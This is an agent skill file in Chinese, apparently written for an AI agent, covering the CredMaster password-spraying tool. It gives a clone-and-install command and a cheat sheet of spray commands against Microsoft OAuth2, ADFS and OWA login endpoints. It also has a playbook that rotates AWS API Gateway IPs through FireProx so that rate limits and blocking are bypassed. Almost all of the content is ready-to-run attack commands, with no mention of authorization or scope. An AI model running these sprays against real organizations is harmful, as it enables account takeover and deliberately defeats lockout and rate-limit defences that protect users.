---
name: credmaster-fireprox-spray
description: 渗透工具 skill:CredMaster 的安装、参数速查与攻击场景 playbook。当任务涉及 口令与哈希破解 需要调用 CredMaster 时使用。
when-to-use: 渗透工具 skill:CredMaster 的安装、参数速查与攻击场景 playbook。当任务涉及 口令与哈希破解 需要调用 CredMaster 时使用。
---

# CredMaster

- 攻击大类:C25 口令与哈希破解
- 上游仓库:https://github.com/knavesec/CredMaster
- 上游 License:MIT(本 SKILL.md 以 Apache-2.0 二次开源,上游版权归原项目所有)

## 安装

```bash
git clone https://github.com/knavesec/CredMaster && cd CredMaster && pip install -r requirements.txt
```

## 参数速查

| 参数 / 命令 | 说明 |
| --- | --- |
| `python3 credmaster.py --plugin oauth2 -u users.txt -p pass.txt --url https://login.microsoftonline.com` | OAuth2 喷洒 |
| `--plugin adfs -u u.txt -p p.txt --url https://adfs.t.com` | ADFS 喷洒 |
| `--plugin owa -u u.txt -p p.txt --url https://mail.t.com` | OWA 喷洒 |
| `--threads 5` | 线程 |

## 攻击场景 Playbook

### FireProx 轮换 IP 喷洒

```bash
python3 credmaster.py --plugin oauth2 -u emails.txt -p 'Pass123!' --accesskey AKIA...
# 每个请求走新的 AWS API Gateway IP,绕过 IP 限速
```

## 注意事项

用 AWS API Gateway(FireProx)动态轮换出口 IP 做密码喷洒,极大降低封禁风险。
